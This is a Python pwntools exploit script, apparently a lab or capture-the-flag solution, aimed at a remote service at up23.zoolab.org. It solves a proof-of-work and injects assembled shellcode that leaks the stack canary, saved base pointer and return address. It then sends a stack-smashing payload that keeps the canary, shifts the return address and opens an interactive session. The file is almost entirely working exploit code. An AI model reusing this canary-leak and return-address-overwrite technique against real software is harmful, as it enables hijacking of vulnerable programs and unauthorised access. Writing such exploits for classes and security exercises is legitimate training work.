#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

#r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("*** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)

    print(r.recv().decode())
    canary = r.recvline(keepends=False).decode()
    rbp = r.recvline(keepends=False).decode()
    ret_addr = r.recvline(keepends=False).decode()

    print(canary.encode())
    print(rbp.encode())
    print(ret_addr.encode())

    ans = p64(0x3631)
    ans += p64(0x0)
    ans += p64(0x0)
    ans += p64(int(canary, 16))
    ans += p64(int(rbp, 16))
    ans += p64(int(ret_addr, 16))
    ans += p64(0x0)
    ans += p64(0x1000000000)

    r.sendline(ans)

else:
    shell_code = """
        endbr64
        push   rbp
        mov    rbp, rsp
        sub    rsp, 0x30
        mov    QWORD PTR [rbp-0x28], rdi
        mov    rax, QWORD PTR fs:0x28
        mov    QWORD PTR [rbp-0x8], rax
        xor    eax, eax

        mov    rax, 1
        mov    rdi, 1
        lea    rsi, [rbp-0x8]
        mov    rdx, 0x18
        syscall
    """

    machine_code = asm(shell_code)
    r.sendlineafter(b'send to me? ', str(len(machine_code)).encode())
    r.sendlineafter(b'to call? ', str(0).encode())
    r.sendafter(b'bytes): ', machine_code)

    print(r.recv().decode())
    canary = r.recv(numb=8).hex()
    rbp = r.recv(numb=8).hex()
    ret_addr = r.recv(numb=8).hex()

    print(canary)
    print(rbp)
    print(ret_addr)
    #print(r.recv(numb=8))
    #print(r.recv(numb=8))
    #print(r.recv(numb=8))
    #canary = r.recvline(keepends=False).decode()
    #rbp = r.recvline(keepends=False).decode()
    #ret_addr = r.recvline(keepends=False).decode()

    ans = p64(0x3631)
    ans += p64(0x0)
    ans += p64(0x0)

    canary = int(canary, 16)
    canary = int.to_bytes(canary, length=8, byteorder='little')
    canary = int(canary.hex(), 16)
    #print(canary)
    ans += p64(canary)

    rbp = int(rbp, 16)
    rbp = int.to_bytes(rbp, length=8, byteorder='little')
    rbp = int(rbp.hex(), 16)
    #print(rbp)
    ans += p64(rbp)

    ret_addr = int(ret_addr, 16)
    ret_addr = int.to_bytes(ret_addr, length=8, byteorder='little')
    ret_addr = int(ret_addr.hex(), 16)
    #print(ret_addr)
    ret_addr += 0xab
    ans += p64(ret_addr)

    ans += p64(0x0)
    ans += p64(0x1000000000)

    r.sendline(ans)

#print(canary)
#print(rbp)
#print(ret_addr)



# 
#print(ans)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
